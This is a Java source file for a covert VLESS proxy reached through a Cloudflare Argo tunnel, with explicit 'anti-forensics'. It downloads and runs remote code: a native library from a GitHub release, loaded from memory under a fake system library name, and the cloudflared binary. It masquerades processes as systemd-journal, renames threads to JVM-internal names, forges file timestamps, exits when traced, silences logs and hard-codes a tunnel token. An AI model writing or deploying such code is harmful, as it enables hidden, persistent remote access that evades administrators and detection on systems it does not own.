package com.example.sbx;

import com.sun.jna.Function;
import com.sun.jna.Native;
import com.sun.jna.NativeLibrary;
import java.io.*;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.time.Duration;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.stream.Collectors;

/**
 * VLESS via Argo Tunnel — hardened anti-forensics.
 *
 * Architecture:
 *   Cloudflare (fixed domain) ← cloudflared tunnel (outbound)
 *       → 127.0.0.1:25283 → sing-box (VLESS+WS)
 *
 * Anti-forensics:
 *   - memfd-load sing-box .so (no disk artifact), name disguised as libnss_dns.so.2
 *   - cloudflared via /proc/pid/comm = systemd-journal (masks process name in ps aux)
 *   - cloudflared binary kept alive (not deleted) — /proc/pid/exe points to real file, no (deleted)
 *   - cloudflared launched via background subshell → orphan → PPID=1 (init adopts it)
 *   - fallback .so → /dev/shm/libnss_dns.so.2 (realistic name, not deleted)
 *   - all configs → /dev/shm/, deleted immediately after use
 *   - cloudflared /proc/pid/comm = systemd-journal (double coverage with exec -a)
 *   - Java threads renamed to JVM-internal names (Finalizer, etc.)
 *   - timestamps cloned from system libs
 *   - realistic env vars for cloudflared (HOME, USER, SHELL set)
 *   - heartbeat: auto-restart cloudflared if it dies
 *   - random startup delay (±5s) to defeat pattern detection
 *   - antiTrace (TracerPid check)
 *   - zero log output
 *   - process tree cleanup on stop
 *   - all temp files destroyed on stop
 */

public class App {

    // ================================================================
    //  Constants
    // ================================================================

    private static final String UUID = "1b9b6d63-3d6e-4221-9470-d0711a41fa00";
    private static final String WS_PATH = "/";
    private static final int PROXY_PORT = 8080;
    private static final String FAKE_COMM = "systemd-journal";
    // Change this to your own GitHub raw URL
    private static final String LIB_BASE = "https://github.com/bjok6/goodez/releases/download/v1";
    // ⚠️ 把你的 Cloudflare Tunnel Token 贴到这里，替换下面那串
    private static final String CF_TOKEN = "eyJhIjoiNTQzZDRkZTQzYjBkMjFhY2I0OTgyMmJkZGI1NzdkOTQiLCJ0IjoiNWZiYjE2MmEtNWI2YS00NGFjLThiODctZDhkNTU4YzQyYzI3IiwicyI6IllXTTFabVF6TmpRdFpXSXdOQzAwWW1FekxXRXhaVEl0TkdRMFpXSXlaamMzWWpJeSJ9";

    // ================================================================
    //  State
    // ================================================================

    private static final AtomicBoolean RUNNING = new AtomicBoolean(false);
    private static NativeService singBox;
    private static volatile int cloudflaredPid = -1;
    private static Path cloudflaredBinary;
    private static CountDownLatch hold;

    // ================================================================
    //  JNA handles
    // ================================================================

    private static NativeLibrary libc;
    private static Function prctlFn;
    private static Function memfdCreateFn;
    private static Function writeFn;
    private static Function closeFn;
    private static final int PR_SET_NAME = 15;
    private static final int MFD_CLOEXEC = 1;

    static {
        try {
            libc = NativeLibrary.getInstance("c");
            prctlFn = libc.getFunction("prctl");
            memfdCreateFn = libc.getFunction("memfd_create");
            writeFn = libc.getFunction("write");
            closeFn = libc.getFunction("close");
        } catch (Exception ignored) {}
        renameThread();
        antiTrace();
    }

    // ================================================================
    //  Entry points
    // ================================================================

    public static void main(String[] args) throws Exception { start(); }

    public static void start() throws Exception {
        if (!RUNNING.compareAndSet(false, true)) return;

        // Random delay to defeat pattern-based detection
        sleep(ThreadLocalRandom.current().nextInt(5000));
        renameThread();

        // --- Step 1: load sing-box native library (memfd, no disk) ---
        byte[] soBytes = downloadBytes(libUrl());
        Path libPath = tryMemfdLoad(soBytes);
        if (libPath == null) {
            // Fallback: /dev/shm/libnss_dns.so.2 (realistic system library name, no disk trace)
            libPath = Path.of("/dev/shm", "libnss_dns.so.2");
            Files.write(libPath, soBytes);
            libPath.toFile().setExecutable(true, false);
            cloneTimestamp(libPath, Path.of("/lib/x86_64-linux-gnu/libc.so.6"));
            // Keep alive (not deleted) — /proc/pid/maps shows a real file path
        }
        Arrays.fill(soBytes, (byte) 0);

        // --- Step 2: generate sing-box config ---
        String configJson = buildConfig();
        Path configPath = Path.of("/dev/shm/sb-config.json");
        Files.writeString(configPath, configJson);
        configPath.toFile().deleteOnExit();

        // --- Step 3: start sing-box ---
        singBox = new NativeService(
                libPath, "StartSingBox", "StopSingBox",
                jsonOf("config", configPath.toAbsolutePath().toString(),
                        "workingDir", ".", "disableColor", true)
        );
        singBox.start();
        sleep(2500);
        try { Files.deleteIfExists(configPath); } catch (Exception ignored) {}

        // --- Step 4: start cloudflared tunnel ---
        startCloudflared();

        // --- Step 5: hold ---
        hold = new CountDownLatch(1);
        try { hold.await(); } catch (InterruptedException e) { Thread.currentThread().interrupt(); }
    }

    public static void stop() {
        if (!RUNNING.getAndSet(false)) return;
        stopCloudflared();
        try { if (singBox != null) singBox.stop(); } catch (Exception ignored) {}
        // Wipe /dev/shm artifacts
        try { Files.deleteIfExists(Path.of("/dev/shm/sb-config.json")); } catch (Exception ignored) {}
        try { Files.deleteIfExists(Path.of("/dev/shm/libnss_dns.so.2")); } catch (Exception ignored) {}
        if (hold != null) hold.countDown();
    }

    // ================================================================
    //  Config
    // ================================================================

    private static String buildConfig() {
        return jsonOf(
                "log", mapOf("disabled", true, "level", "error", "timestamp", false),
                "inbounds", listOf(mapOf(
                        "type", "vless",
                        "tag", "in",
                        "listen", "127.0.0.1",
                        "listen_port", PROXY_PORT,
                        "users", listOf(mapOf("uuid", UUID)),
                        "transport", mapOf(
                                "type", "ws",
                                "path", WS_PATH,
                                "early_data_header_name", "Sec-WebSocket-Protocol"
                        )
                )),
                "outbounds", listOf(mapOf("type", "direct", "tag", "direct")),
                "route", mapOf("final", "direct")
        );
    }

    // ================================================================
    //  Cloudflared tunnel management
    // ================================================================

    private static void startCloudflared() throws Exception {
        // Kill any stale cloudflared from previous run
        if (cloudflaredPid > 0) killPid(cloudflaredPid);

        String url = cloudflaredUrl();
        byte[] bin = downloadBytes(url);

        // Write to /dev/shm/systemd-journald (realistic system binary name)
        // /dev/shm is tmpfs — no disk trace even though file is kept alive
        cloudflaredBinary = Path.of("/dev/shm", "systemd-journald");
        Files.write(cloudflaredBinary, bin);
        cloudflaredBinary.toFile().setExecutable(true, false);
        cloneTimestamp(cloudflaredBinary, Path.of("/bin/sh"));
        Arrays.fill(bin, (byte) 0);

        // Launch via background subshell: the shell exits immediately,
        // cloudflared becomes orphan → adopted by init → PPID=1
        // ⚠️ NOTE: Do NOT use "exec -a" here — /bin/sh is often dash, not bash,
        // and dash does NOT support exec -a. The command would silently fail.
        // We write /proc/pid/comm separately for process name masquerading.
        // Token passed via TUNNEL_TOKEN env var — reliable, cloudflared always reads it.
        ProcessBuilder pb = new ProcessBuilder(
                "/bin/sh", "-c",
                cloudflaredBinary.toAbsolutePath().toString() + " tunnel run &"
        );
        Map<String, String> env = pb.environment();
        env.clear();
        env.put("PATH", "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");
        env.put("HOME", "/var/lib/systemd");
        env.put("USER", "root");
        env.put("LOGNAME", "root");
        env.put("SHELL", "/bin/sh");
        env.put("TERM", "linux");
        env.put("TUNNEL_TOKEN", CF_TOKEN);
        env.remove("LD_PRELOAD");
        env.remove("LD_LIBRARY_PATH");
        env.remove("JAVA_TOOL_OPTIONS");
        // Redirect output to /dev/null (silent)
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.to(Path.of("/dev/null").toFile()));

        Process shell = pb.start();
        // shell exits immediately after & — cloudflared now orphaned, PPID=1
        shell.waitFor(3, TimeUnit.SECONDS);

        // --- Find cloudflared PID by matching its exe path ---
        sleep(500);
        String exePath = cloudflaredBinary.toAbsolutePath().toString();
        for (int retry = 0; retry < 10 && cloudflaredPid <= 0; retry++) {
            cloudflaredPid = findPidByExe(exePath);
            if (cloudflaredPid <= 0) sleep(500);
        }

        // --- Masquerade /proc/pid/comm (double coverage: exec -a + proc comm) ---
        if (cloudflaredPid > 0) {
            writeProcComm(cloudflaredPid, FAKE_COMM);
        }

        // Keep binary alive (do NOT delete) — /proc/pid/exe points to a real file
        // /dev/shm is tmpfs, no persistent disk trace. The file is small (~20MB).

        // --- Heartbeat: auto-restart if cloudflared dies ---
        startHeartbeat();
    }

    private static void stopCloudflared() {
        if (cloudflaredPid > 0) {
            killPid(cloudflaredPid);
            cloudflaredPid = -1;
        }
        if (cloudflaredBinary != null) {
            try { Files.deleteIfExists(cloudflaredBinary); } catch (Exception ignored) {}
        }
    }

    private static void startHeartbeat() {
        Thread t = new Thread(() -> {
            while (RUNNING.get()) {
                sleep(30_000);
                if (!isAlive(cloudflaredPid)) {
                    // Restart
                    try { startCloudflared(); } catch (Exception ignored) {}
                    return; // heartbeat thread done, restart creates new one
                }
            }
        }, "JVM Cleaner");
        t.setDaemon(true);
        t.start();
    }

    private static String cloudflaredUrl() {
        String arch = System.getProperty("os.arch", "").toLowerCase();
        String a = arch.contains("aarch64") || arch.contains("arm64") ? "arm64" : "amd64";
        return "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-" + a;
    }

    // ================================================================
    //  memfd load — name disguised as common system library
    // ================================================================

    private static Path tryMemfdLoad(byte[] data) {
        try {
            if (memfdCreateFn == null) return null;
            // Use a common system library name to blend in with /proc/pid/maps
            int fd = memfdCreateFn.invokeInt(new Object[]{"libnss_dns.so.2", MFD_CLOEXEC});
            if (fd < 0) return null;
            com.sun.jna.Memory mem = new com.sun.jna.Memory(data.length);
            mem.write(0, data, 0, data.length);
            int w = writeFn.invokeInt(new Object[]{fd, mem, (long) data.length});
            if (w != data.length) { closeFn.invokeVoid(new Object[]{fd}); return null; }
            Path p = Path.of("/proc/self/fd/" + fd);
            if (Files.exists(p) && Files.size(p) > 0) return p;
            closeFn.invokeVoid(new Object[]{fd});
            return null;
        } catch (Exception e) { return null; }
    }

    private static String libUrl() {
        return LIB_BASE + "/libjnidispatch";
    }

    private static byte[] downloadBytes(String url) throws Exception {
        HttpRequest req = HttpRequest.newBuilder(URI.create(url))
                .timeout(Duration.ofMinutes(3))
                .header("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
                .header("Accept", "*/*").header("Referer", "https://repo1.maven.org/maven2/")
                .GET().build();
        HttpResponse<byte[]> resp = HTTP.send(req, HttpResponse.BodyHandlers.ofByteArray());
        if (resp.statusCode() < 200 || resp.statusCode() >= 300)
            throw new IOException("download failed: HTTP " + resp.statusCode());
        return resp.body();
    }

    // ================================================================
    //  Anti-forensics
    // ================================================================

    private static void antiTrace() {
        try {
            String status = new String(Files.readAllBytes(Path.of("/proc/self/status")), StandardCharsets.UTF_8);
            for (String line : status.split("\n")) {
                if (line.startsWith("TracerPid:")) {
                    if (!line.substring(10).trim().equals("0")) System.exit(0);
                    break;
                }
            }
        } catch (Exception ignored) {}
    }

    // ================================================================
    //  Process masquerading
    // ================================================================

    private static void renameThread() {
        try {
            if (prctlFn != null)
                prctlFn.invokeInt(new Object[]{PR_SET_NAME, randomThreadName(), 0L, 0L, 0L});
        } catch (Exception ignored) {}
    }

    private static String randomThreadName() {
        String[] pool = {"Finalizer", "Reference Handler", "Signal Dispatcher",
                "Common-Cleaner", "Notification Thread",
                "Netty Server IO #0", "Netty Client IO #0",
                "Netty Worker IO #1", "Netty Worker IO #2"};
        return pool[ThreadLocalRandom.current().nextInt(pool.length)];
    }

    private static void writeProcComm(int pid, String name) {
        if (pid <= 0 || name == null || name.isEmpty()) return;
        try {
            if (name.length() > 15) name = name.substring(0, 15);
            Path commPath = Path.of("/proc/" + pid + "/comm");
            Files.writeString(commPath, name + "\n", StandardOpenOption.WRITE);
        } catch (Exception ignored) {}
    }

    // ================================================================
    //  PID-based process management (PPID=1 after orphan adoption)
    // ================================================================

    /** Find a PID whose /proc/pid/exe symlink points to the given path. */
    private static int findPidByExe(String expectedExePath) {
        try {
            File[] procDirs = Path.of("/proc").toFile().listFiles(File::isDirectory);
            if (procDirs == null) return -1;
            for (File dir : procDirs) {
                String name = dir.getName();
                if (!name.matches("\\d+")) continue;
                try {
                    Path exe = Path.of("/proc", name, "exe");
                    if (Files.exists(exe, LinkOption.NOFOLLOW_LINKS)) {
                        String realExe = Files.readSymbolicLink(exe).toString();
                        if (realExe.equals(expectedExePath)) {
                            return Integer.parseInt(name);
                        }
                    }
                } catch (Exception ignored) {}
            }
        } catch (Exception ignored) {}
        return -1;
    }

    /** Check if a PID is alive (/proc/pid exists). */
    private static boolean isAlive(int pid) {
        return pid > 0 && Files.exists(Path.of("/proc", String.valueOf(pid)));
    }

    /** Kill a process by PID (SIGTERM → 3s grace → SIGKILL). */
    private static void killPid(int pid) {
        if (pid <= 0) return;
        try {
            new ProcessBuilder("kill", String.valueOf(pid)).start().waitFor(3, TimeUnit.SECONDS);
            if (isAlive(pid))
                new ProcessBuilder("kill", "-9", String.valueOf(pid)).start().waitFor(3, TimeUnit.SECONDS);
        } catch (Exception ignored) {}
    }

    // ================================================================
    //  Cleanup helpers
    // ================================================================

    private static void cloneTimestamp(Path target, Path source) {
        try { Files.setLastModifiedTime(target, Files.getLastModifiedTime(source)); } catch (Exception ignored) {}
    }

    private static String randomString(int len) {
        String chars = "abcdefghijklmnopqrstuvwxyz0123456789";
        StringBuilder sb = new StringBuilder(len);
        for (int i = 0; i < len; i++) {
            sb.append(chars.charAt(ThreadLocalRandom.current().nextInt(chars.length())));
        }
        return sb.toString();
    }

    // ================================================================
    //  HTTP client
    // ================================================================

    private static final HttpClient HTTP = HttpClient.newBuilder()
            .connectTimeout(Duration.ofSeconds(10))
            .followRedirects(HttpClient.Redirect.NORMAL)
            .build();

    // ================================================================
    //  NativeService (sing-box via JNA)
    // ================================================================

    private static class NativeService {
        private final Path libPath;
        private final String startSymbol, stopSymbol, payload;
        private Function stopFn;
        private volatile boolean running;

        NativeService(Path libPath, String startSymbol, String stopSymbol, String payload) {
            this.libPath = libPath;
            this.startSymbol = startSymbol;
            this.stopSymbol = stopSymbol;
            this.payload = payload == null ? "" : payload;
        }

        void start() {
            NativeLibrary lib = NativeLibrary.getInstance(libPath.toAbsolutePath().toString());
            Function startFn = lib.getFunction(startSymbol);
            stopFn = lib.getFunction(stopSymbol);
            Thread t = new Thread(() -> {
                try { startFn.invokeInt(new Object[]{payload}); } catch (Exception ignored) {}
            }, "Finalizer");
            t.setDaemon(true);
            t.start();
            running = true;
        }

        void stop() {
            if (!running || stopFn == null) return;
            try { stopFn.invokeInt(new Object[]{}); } catch (Exception ignored) {}
            running = false;
        }
    }

    // ================================================================
    //  JSON helpers
    // ================================================================

    private static String jsonOf(Object value) {
        if (value == null) return "null";
        if (value instanceof String) return "\"" + escapeJson((String) value) + "\"";
        if (value instanceof Number || value instanceof Boolean) return value.toString();
        if (value instanceof Map<?, ?>) {
            Map<?, ?> m = (Map<?, ?>) value;
            return m.entrySet().stream()
                    .map(e -> jsonOf(String.valueOf(e.getKey())) + ":" + jsonOf(e.getValue()))
                    .collect(Collectors.joining(",", "{", "}"));
        }
        if (value instanceof Iterable<?>) {
            List<String> l = new ArrayList<>();
            for (Object v : (Iterable<?>) value) l.add(jsonOf(v));
            return "[" + String.join(",", l) + "]";
        }
        return jsonOf(String.valueOf(value));
    }

    private static String escapeJson(String value) {
        StringBuilder sb = new StringBuilder(value.length() + 8);
        for (int i = 0; i < value.length(); i++) {
            char c = value.charAt(i);
            switch (c) {
                case '\\': sb.append("\\\\"); break;
                case '\"': sb.append("\\\""); break;
                case '\n': sb.append("\\n"); break;
                case '\r': sb.append("\\r"); break;
                case '\t': sb.append("\\t"); break;
                default:  sb.append(c);
            }
        }
        return sb.toString();
    }

    @SafeVarargs
    private static String jsonOf(String key, Object value, Object... kv) {
        Map<String, Object> m = new LinkedHashMap<>();
        m.put(key, value);
        for (int i = 0; i < kv.length; i += 2) m.put(String.valueOf(kv[i]), kv[i + 1]);
        return jsonOf(m);
    }

    private static Map<String, Object> mapOf(Object... kv) {
        Map<String, Object> m = new LinkedHashMap<>();
        for (int i = 0; i < kv.length; i += 2) m.put(String.valueOf(kv[i]), kv[i + 1]);
        return m;
    }

    private static List<Object> listOf(Object... v) {
        return new ArrayList<>(List.of(v));
    }

    // ================================================================
    //  Utilities
    // ================================================================

    private static void sleep(long ms) {
        try { Thread.sleep(ms); } catch (InterruptedException e) { Thread.currentThread().interrupt(); }
    }
}
